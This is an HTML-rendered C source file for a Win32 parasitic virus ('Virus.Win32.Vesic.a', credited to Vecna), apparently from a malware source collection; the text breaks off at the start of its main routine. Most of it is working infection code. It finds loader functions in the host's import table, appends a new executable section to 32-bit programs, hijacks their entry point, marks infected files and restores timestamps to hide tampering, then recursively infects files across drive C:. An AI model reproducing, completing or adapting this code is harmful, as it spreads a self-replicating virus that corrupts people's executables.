<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win32.Vesic.a - vir.c.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
.sc19 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">//sic semper tirannis
//(c) Vecna
//
//parasitic c virus, 7200 bytes long. run under the default browser context.
//background scanning. use GetModuleHandle/LoadLibrary and GetProcAddress from
//host IAT.
</span><span class="sc0">
</span><span class="sc9">#include &lt;windows.h&gt;
#include &lt;winsock.h&gt;
#include "mz.h"
#include "pe.h"
</span><span class="sc0">
</span><span class="sc9">#include "vir.h"
</span><span class="sc0">
</span><span class="sc9">#define WORKSIZE 0x4000
#define CODE_SIZE 0x3000-1
</span><span class="sc0">
</span><span class="sc9">#ifndef MUTANT_QUERY_STATE
#define MUTANT_QUERY_STATE      0x0001
#endif
</span><span class="sc0">
</span><span class="sc9">#include "entry.h"
#include "stub.h"
</span><span class="sc0">
</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc19">name</span><span class="sc10">[]=</span><span class="sc6">"sic semper tirannis\n"</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">exe_mem</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">exe_size</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">rva2raw</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">base</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc10">){</span><span class="sc0">
  </span><span class="sc11">MZ_HEADER</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mz</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">PE_HEADER</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pe</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">PE_OBJENTRY</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">objtable</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">count</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc11">mz</span><span class="sc10">=(</span><span class="sc11">MZ_HEADER</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">base</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc11">pe</span><span class="sc10">=(</span><span class="sc11">PE_HEADER</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">base</span><span class="sc10">[</span><span class="sc11">mz</span><span class="sc10">-&gt;</span><span class="sc11">mz_neptr</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc11">objtable</span><span class="sc10">=(</span><span class="sc11">PE_OBJENTRY</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">base</span><span class="sc10">[</span><span class="sc11">mz</span><span class="sc10">-&gt;</span><span class="sc11">mz_neptr</span><span class="sc10">+</span><span class="sc4">0x18</span><span class="sc10">+</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_ntheadersize</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc11">count</span><span class="sc10">=</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_numofobjects</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">count</span><span class="sc10">--){</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">rva</span><span class="sc10">&gt;=</span><span class="sc11">objtable</span><span class="sc10">-&gt;</span><span class="sc11">oe_virtrva</span><span class="sc10">)&amp;&amp;(</span><span class="sc11">rva</span><span class="sc10">&lt;(</span><span class="sc11">objtable</span><span class="sc10">-&gt;</span><span class="sc11">oe_virtrva</span><span class="sc10">+</span><span class="sc11">objtable</span><span class="sc10">-&gt;</span><span class="sc11">oe_virtsize</span><span class="sc10">)))</span><span class="sc0">
      </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">rva</span><span class="sc10">-</span><span class="sc11">objtable</span><span class="sc10">-&gt;</span><span class="sc11">oe_virtrva</span><span class="sc10">)+</span><span class="sc11">objtable</span><span class="sc10">-&gt;</span><span class="sc11">oe_physoffs</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">objtable</span><span class="sc10">++;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc9">#define RVA2RAW(X) &amp;base[rva2raw(base,X)]
</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">scan_iat</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">base</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">getmhnd</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">getproc</span><span class="sc10">){</span><span class="sc0">
  </span><span class="sc11">MZ_HEADER</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mz</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">PE_HEADER</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pe</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">PE_IMPORT</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">iat</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">names</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">pointers</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc10">*</span><span class="sc11">getmhnd</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">*</span><span class="sc11">getproc</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">mz</span><span class="sc10">=(</span><span class="sc11">MZ_HEADER</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">base</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc11">pe</span><span class="sc10">=(</span><span class="sc11">PE_HEADER</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">base</span><span class="sc10">[</span><span class="sc11">mz</span><span class="sc10">-&gt;</span><span class="sc11">mz_neptr</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc11">iat</span><span class="sc10">=(</span><span class="sc11">PE_IMPORT</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">RVA2RAW</span><span class="sc10">(</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_importrva</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">iat</span><span class="sc10">-&gt;</span><span class="sc11">im_name</span><span class="sc10">){</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">((!</span><span class="sc11">lstrcmpi</span><span class="sc10">(</span><span class="sc11">RVA2RAW</span><span class="sc10">(</span><span class="sc11">iat</span><span class="sc10">-&gt;</span><span class="sc11">im_name</span><span class="sc10">),</span><span class="sc6">"KERNEL32"</span><span class="sc10">))||(!</span><span class="sc11">lstrcmpi</span><span class="sc10">(</span><span class="sc11">RVA2RAW</span><span class="sc10">(</span><span class="sc11">iat</span><span class="sc10">-&gt;</span><span class="sc11">im_name</span><span class="sc10">),</span><span class="sc6">"KERNEL32.DLL"</span><span class="sc10">))){</span><span class="sc0">
      </span><span class="sc11">names</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">iat</span><span class="sc10">-&gt;</span><span class="sc11">im_lookup</span><span class="sc10">?</span><span class="sc11">RVA2RAW</span><span class="sc10">(</span><span class="sc11">iat</span><span class="sc10">-&gt;</span><span class="sc11">im_lookup</span><span class="sc10">):</span><span class="sc11">RVA2RAW</span><span class="sc10">(</span><span class="sc11">iat</span><span class="sc10">-&gt;</span><span class="sc11">im_addresstable</span><span class="sc10">));</span><span class="sc0">
      </span><span class="sc11">pointers</span><span class="sc10">=</span><span class="sc11">iat</span><span class="sc10">-&gt;</span><span class="sc11">im_addresstable</span><span class="sc10">+</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_imagebase</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc5">while</span><span class="sc10">(*</span><span class="sc11">names</span><span class="sc10">){</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(!(</span><span class="sc11">lstrcmp</span><span class="sc10">(</span><span class="sc11">RVA2RAW</span><span class="sc10">(*</span><span class="sc11">names</span><span class="sc10">)+</span><span class="sc4">2</span><span class="sc10">,</span><span class="sc6">"GetModuleHandleA"</span><span class="sc10">))||(!(</span><span class="sc11">lstrcmp</span><span class="sc10">(</span><span class="sc11">RVA2RAW</span><span class="sc10">(*</span><span class="sc11">names</span><span class="sc10">)+</span><span class="sc4">2</span><span class="sc10">,</span><span class="sc6">"LoadLibraryA"</span><span class="sc10">))))*</span><span class="sc11">getmhnd</span><span class="sc10">=</span><span class="sc11">pointers</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(!(</span><span class="sc11">lstrcmp</span><span class="sc10">(</span><span class="sc11">RVA2RAW</span><span class="sc10">(*</span><span class="sc11">names</span><span class="sc10">)+</span><span class="sc4">2</span><span class="sc10">,</span><span class="sc6">"GetProcAddress"</span><span class="sc10">)))*</span><span class="sc11">getproc</span><span class="sc10">=</span><span class="sc11">pointers</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">pointers</span><span class="sc10">+=</span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">names</span><span class="sc10">++;</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">iat</span><span class="sc10">++;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">getmhnd</span><span class="sc10">&amp;&amp;*</span><span class="sc11">getproc</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc9">#define ALIGN(X,Y) ((X+(Y-1))&amp;(~(Y-1)))
#define MARK       'SST'
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">infect</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fname</span><span class="sc10">){</span><span class="sc0">
  </span><span class="sc11">MZ_HEADER</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mz</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">PE_HEADER</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pe</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">PE_OBJENTRY</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">objtable</span><span class="sc10">,*</span><span class="sc11">lastobj</span><span class="sc10">,*</span><span class="sc11">newobj</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hnd</span><span class="sc10">,</span><span class="sc11">hnd2</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">FILETIME</span><span class="sc0"> </span><span class="sc11">tcreated</span><span class="sc10">,</span><span class="sc11">taccessed</span><span class="sc10">,</span><span class="sc11">twritten</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sze</span><span class="sc10">,</span><span class="sc11">aux</span><span class="sc10">,</span><span class="sc11">attr</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">base</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc11">attr</span><span class="sc10">=</span><span class="sc11">GetFileAttributes</span><span class="sc10">(</span><span class="sc11">fname</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">SetFileAttributes</span><span class="sc10">(</span><span class="sc11">fname</span><span class="sc10">,</span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">)){</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc16">int</span><span class="sc10">)(</span><span class="sc11">hnd</span><span class="sc10">=</span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">fname</span><span class="sc10">,</span><span class="sc11">GENERIC_READ</span><span class="sc10">+</span><span class="sc11">GENERIC_WRITE</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">))!=-</span><span class="sc4">1</span><span class="sc10">){</span><span class="sc0">
      </span><span class="sc11">GetFileTime</span><span class="sc10">(</span><span class="sc11">hnd</span><span class="sc10">,&amp;</span><span class="sc11">tcreated</span><span class="sc10">,&amp;</span><span class="sc11">taccessed</span><span class="sc10">,&amp;</span><span class="sc11">twritten</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">sze</span><span class="sc10">=</span><span class="sc11">GetFileSize</span><span class="sc10">(</span><span class="sc11">hnd</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">hnd2</span><span class="sc10">=</span><span class="sc11">CreateFileMapping</span><span class="sc10">(</span><span class="sc11">hnd</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">PAGE_READWRITE</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">sze</span><span class="sc10">+</span><span class="sc11">WORKSIZE</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">)){</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">base</span><span class="sc10">=</span><span class="sc11">MapViewOfFile</span><span class="sc10">(</span><span class="sc11">hnd2</span><span class="sc10">,</span><span class="sc11">FILE_MAP_ALL_ACCESS</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">)){</span><span class="sc0">
          </span><span class="sc11">mz</span><span class="sc10">=(</span><span class="sc11">MZ_HEADER</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">base</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">];</span><span class="sc0">
          </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">mz</span><span class="sc10">-&gt;</span><span class="sc11">mz_id</span><span class="sc10">==</span><span class="sc7">'MZ'</span><span class="sc10">)&amp;&amp;(</span><span class="sc11">mz</span><span class="sc10">-&gt;</span><span class="sc11">mz_neptr</span><span class="sc10">&lt;</span><span class="sc11">sze</span><span class="sc10">)){</span><span class="sc0">
            </span><span class="sc11">pe</span><span class="sc10">=(</span><span class="sc11">PE_HEADER</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">base</span><span class="sc10">[</span><span class="sc11">mz</span><span class="sc10">-&gt;</span><span class="sc11">mz_neptr</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_id</span><span class="sc10">==</span><span class="sc7">'PE\x00\x00'</span><span class="sc10">)&amp;&amp;(</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_checksum</span><span class="sc10">!=</span><span class="sc11">MARK</span><span class="sc10">)&amp;&amp;</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_entrypointrva</span><span class="sc10">){</span><span class="sc0">
              </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_flags</span><span class="sc10">&amp;</span><span class="sc11">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc10">)&amp;&amp;(</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_flags</span><span class="sc10">&amp;</span><span class="sc11">IMAGE_FILE_32BIT_MACHINE</span><span class="sc10">)&amp;&amp;(!(</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_flags</span><span class="sc10">&amp;</span><span class="sc11">IMAGE_FILE_DLL</span><span class="sc10">))&amp;&amp;(!(</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_flags</span><span class="sc10">&amp;</span><span class="sc11">IMAGE_FILE_SYSTEM</span><span class="sc10">))){</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">scan_iat</span><span class="sc10">(</span><span class="sc11">base</span><span class="sc10">,</span><span class="sc11">exe_mem</span><span class="sc10">+</span><span class="sc11">ENTRY_PTR</span><span class="sc10">+</span><span class="sc11">ENTRY_GETMHND</span><span class="sc10">,</span><span class="sc11">exe_mem</span><span class="sc10">+</span><span class="sc11">ENTRY_PTR</span><span class="sc10">+</span><span class="sc11">ENTRY_GETPROCA</span><span class="sc10">)){</span><span class="sc0">
                  </span><span class="sc10">*((</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">exe_mem</span><span class="sc10">+</span><span class="sc11">ENTRY_PTR</span><span class="sc10">+</span><span class="sc11">ENTRY_EPOINT</span><span class="sc10">))=</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_entrypointrva</span><span class="sc10">+</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_imagebase</span><span class="sc10">;</span><span class="sc0">
                  </span><span class="sc11">objtable</span><span class="sc10">=(</span><span class="sc11">PE_OBJENTRY</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">base</span><span class="sc10">[</span><span class="sc11">mz</span><span class="sc10">-&gt;</span><span class="sc11">mz_neptr</span><span class="sc10">+</span><span class="sc4">0x18</span><span class="sc10">+</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_ntheadersize</span><span class="sc10">];</span><span class="sc0">
                  </span><span class="sc11">lastobj</span><span class="sc10">=&amp;</span><span class="sc11">objtable</span><span class="sc10">[</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_numofobjects</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">];</span><span class="sc0">
                  </span><span class="sc11">newobj</span><span class="sc10">=&amp;</span><span class="sc11">objtable</span><span class="sc10">[</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_numofobjects</span><span class="sc10">++];</span><span class="sc0">
                  </span><span class="sc11">strcpy</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">newobj</span><span class="sc10">-&gt;</span><span class="sc11">oe_name</span><span class="sc10">,</span><span class="sc6">"SST"</span><span class="sc10">);</span><span class="sc0">
                  </span><span class="sc11">newobj</span><span class="sc10">-&gt;</span><span class="sc11">oe_virtrva</span><span class="sc10">=</span><span class="sc11">ALIGN</span><span class="sc10">(</span><span class="sc11">lastobj</span><span class="sc10">-&gt;</span><span class="sc11">oe_virtsize</span><span class="sc10">+</span><span class="sc11">lastobj</span><span class="sc10">-&gt;</span><span class="sc11">oe_virtrva</span><span class="sc10">,</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_objectalign</span><span class="sc10">);</span><span class="sc0">
                  </span><span class="sc11">newobj</span><span class="sc10">-&gt;</span><span class="sc11">oe_physoffs</span><span class="sc10">=</span><span class="sc11">ALIGN</span><span class="sc10">(</span><span class="sc11">lastobj</span><span class="sc10">-&gt;</span><span class="sc11">oe_physsize</span><span class="sc10">+</span><span class="sc11">lastobj</span><span class="sc10">-&gt;</span><span class="sc11">oe_physoffs</span><span class="sc10">,</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_filealign</span><span class="sc10">);</span><span class="sc0">
                  </span><span class="sc11">newobj</span><span class="sc10">-&gt;</span><span class="sc11">oe_virtsize</span><span class="sc10">=</span><span class="sc11">ALIGN</span><span class="sc10">(</span><span class="sc11">exe_size</span><span class="sc10">,</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_objectalign</span><span class="sc10">);</span><span class="sc0">
                  </span><span class="sc11">newobj</span><span class="sc10">-&gt;</span><span class="sc11">oe_physsize</span><span class="sc10">=</span><span class="sc11">ALIGN</span><span class="sc10">(</span><span class="sc11">exe_size</span><span class="sc10">,</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_filealign</span><span class="sc10">);</span><span class="sc0">
                  </span><span class="sc11">newobj</span><span class="sc10">-&gt;</span><span class="sc11">oe_objectflags</span><span class="sc10">=</span><span class="sc11">IMAGE_SCN_CNT_CODE</span><span class="sc10">|</span><span class="sc11">IMAGE_SCN_MEM_EXECUTE</span><span class="sc10">|</span><span class="sc11">IMAGE_SCN_MEM_READ</span><span class="sc10">;</span><span class="sc0">
                  </span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_sizeofcode</span><span class="sc10">+=</span><span class="sc11">newobj</span><span class="sc10">-&gt;</span><span class="sc11">oe_virtsize</span><span class="sc10">;</span><span class="sc0">
                  </span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_imagesize</span><span class="sc10">=</span><span class="sc11">newobj</span><span class="sc10">-&gt;</span><span class="sc11">oe_virtrva</span><span class="sc10">+</span><span class="sc11">newobj</span><span class="sc10">-&gt;</span><span class="sc11">oe_virtsize</span><span class="sc10">;</span><span class="sc0">
                  </span><span class="sc11">sze</span><span class="sc10">=</span><span class="sc11">newobj</span><span class="sc10">-&gt;</span><span class="sc11">oe_physoffs</span><span class="sc10">+</span><span class="sc11">newobj</span><span class="sc10">-&gt;</span><span class="sc11">oe_physsize</span><span class="sc10">;</span><span class="sc0">
                  </span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_entrypointrva</span><span class="sc10">=</span><span class="sc11">newobj</span><span class="sc10">-&gt;</span><span class="sc11">oe_virtrva</span><span class="sc10">+</span><span class="sc11">ENTRY_PTR</span><span class="sc10">;</span><span class="sc0">
                  </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">aux</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">aux</span><span class="sc10">&lt;=</span><span class="sc11">exe_size</span><span class="sc10">;</span><span class="sc11">aux</span><span class="sc10">++)</span><span class="sc11">base</span><span class="sc10">[</span><span class="sc11">newobj</span><span class="sc10">-&gt;</span><span class="sc11">oe_physoffs</span><span class="sc10">+</span><span class="sc11">aux</span><span class="sc10">]=</span><span class="sc11">exe_mem</span><span class="sc10">[</span><span class="sc11">aux</span><span class="sc10">];</span><span class="sc0">
                  </span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_checksum</span><span class="sc10">=</span><span class="sc11">MARK</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
              </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
          </span><span class="sc11">UnmapViewOfFile</span><span class="sc10">(</span><span class="sc11">base</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hnd2</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc11">SetFilePointer</span><span class="sc10">(</span><span class="sc11">hnd</span><span class="sc10">,</span><span class="sc11">sze</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">FILE_BEGIN</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">SetEndOfFile</span><span class="sc10">(</span><span class="sc11">hnd</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">SetFileTime</span><span class="sc10">(</span><span class="sc11">hnd</span><span class="sc10">,&amp;</span><span class="sc11">tcreated</span><span class="sc10">,&amp;</span><span class="sc11">taccessed</span><span class="sc10">,&amp;</span><span class="sc11">twritten</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hnd</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">SetFileAttributes</span><span class="sc10">(</span><span class="sc11">fname</span><span class="sc10">,</span><span class="sc11">attr</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">folder_search</span><span class="sc10">(){</span><span class="sc0">
  </span><span class="sc11">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc11">finddata</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hnd</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc16">int</span><span class="sc10">)(</span><span class="sc11">hnd</span><span class="sc10">=</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc6">"*.*"</span><span class="sc10">,&amp;</span><span class="sc11">finddata</span><span class="sc10">))!=-</span><span class="sc4">1</span><span class="sc10">){</span><span class="sc0">
    </span><span class="sc5">do</span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">finddata</span><span class="sc10">.</span><span class="sc11">dwFileAttributes</span><span class="sc10">&amp;</span><span class="sc11">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc10">){</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">finddata</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]!=</span><span class="sc7">'.'</span><span class="sc10">){</span><span class="sc0">
          </span><span class="sc11">SetCurrentDirectory</span><span class="sc10">(</span><span class="sc11">finddata</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">folder_search</span><span class="sc10">();</span><span class="sc0">
          </span><span class="sc11">SetCurrentDirectory</span><span class="sc10">(</span><span class="sc6">".."</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc5">else</span><span class="sc0"> </span><span class="sc11">infect</span><span class="sc10">(</span><span class="sc11">finddata</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">FindNextFile</span><span class="sc10">(</span><span class="sc11">hnd</span><span class="sc10">,&amp;</span><span class="sc11">finddata</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">hnd</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">disk_search</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">foo</span><span class="sc10">){</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">

  </span><span class="sc11">GetCurrentDirectoryA</span><span class="sc10">(</span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">SetCurrentDirectoryA</span><span class="sc10">(</span><span class="sc6">"C:\\"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">folder_search</span><span class="sc10">();</span><span class="sc0">
  </span><span class="sc11">SetCurrentDirectoryA</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">virusmain</span><span class="sc10">(){</span><span class="sc0">
